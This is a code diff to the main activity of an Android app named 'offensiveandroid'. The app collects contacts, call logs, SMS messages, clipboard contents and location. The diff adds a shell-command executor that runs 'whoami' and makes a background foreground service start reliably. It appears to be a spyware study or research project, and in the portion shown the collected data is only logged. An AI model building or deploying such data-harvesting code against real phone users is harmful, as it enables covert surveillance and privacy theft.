@@ -3,17 +3,20 @@ package com.example.offensiveandroid
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.os.Build
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
 import android.widget.Button
 import android.widget.Toast
 import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import com.example.offensiveandroid.ui.theme.CallLogsRetriever
 import com.example.offensiveandroid.ui.theme.ContactsRetriever
 import com.example.offensiveandroid.ui.theme.GetClipboard
 import com.example.offensiveandroid.ui.theme.LocationUtils
 import com.example.offensiveandroid.ui.theme.SMSRetriever
+import com.example.offensiveandroid.ui.theme.ShellCmdExe
 import com.google.android.gms.common.api.ResolvableApiException
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.LocationSettingsRequest
@@ -28,6 +31,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var location : LocationUtils
     private lateinit var clipboard : GetClipboard
     private lateinit var button : Button
+    private lateinit var cmdExe : ShellCmdExe
     companion object {
         const val REQUEST_LOCATION_SETTINGS = 1001
         const val BACKGROUND_LOCATION_REQUEST_CODE = 1002
@@ -44,14 +48,25 @@ class MainActivity : AppCompatActivity() {
         sms = SMSRetriever(this)
         location = LocationUtils(this)
         clipboard = GetClipboard(this)
+        cmdExe = ShellCmdExe()
         button = findViewById(R.id.button)
         button.setOnClickListener {
             Log.d("Clipboard",clipboard.getClipboardData())
         }
 
+
+
         checkAndRequestPermissions()
-        val serviceIntent = Intent(this, MyForegroundService::class.java)
-        startService(serviceIntent)
+        try {
+            val serviceIntent = Intent(this, MyForegroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                ContextCompat.startForegroundService(this, serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+        } catch (e: Exception) {
+            Log.e("ForegroundService", "Failed to start service: ${e.message}")
+        }
     }
 
     private fun checkAndRequestPermissions() {
@@ -100,6 +115,7 @@ class MainActivity : AppCompatActivity() {
             Log.e("Contacts",contacts.getAllContacts().toString())
             Log.e("CallLogs",callLogs.getCallLogs().toString())
             Log.e("SMS", sms.getSMS().toString())
+            Log.e("Command",cmdExe.execute("whoami"))
             location.requestLocationUpdates(
                 interval = 10000L,
                 fasterInterval = 5000L,
